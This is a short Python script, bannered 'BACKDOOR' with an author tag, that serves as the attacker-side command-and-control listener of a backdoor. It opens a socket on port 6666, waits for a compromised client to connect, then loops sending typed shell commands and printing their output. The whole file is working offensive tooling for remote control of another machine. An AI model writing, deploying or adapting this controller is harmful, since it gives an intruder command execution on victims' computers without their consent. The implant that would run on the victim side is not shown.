import socket
from colorama import Fore

print(Fore.GREEN+"""
        ___  ____ ____ _  _ ___  ____ ____ ____
        |__] |__| |    |_/  |  \ |  | |  | |__/
        |__] |  | |___ | \_ |__/ |__| |__| |  \

"""+Fore.RED +   "\t\tauthor: cholalien" +Fore.WHITE)

server = socket.socket()

host = '127.0.0.1' # remote host
port = 6666 # remote port

server.bind((host , port))
server.listen()
print('[+] Server Started')
print('[+] Listening For Client Connection ...')

client_sock , client_addr = server.accept()
print(Fore.RED + f"[+] Connaction has been established with {client_addr}"+Fore.WHITE)

while True:
    command = str(input("Enter a command: "))
    command = command.encode()
    client_sock.send(command)
    print("[+] command has sended successfully")

    output = client_sock.recv(1024)
    output = output.decode()
    print("[+] OUTPUT [+]")
    print(output)
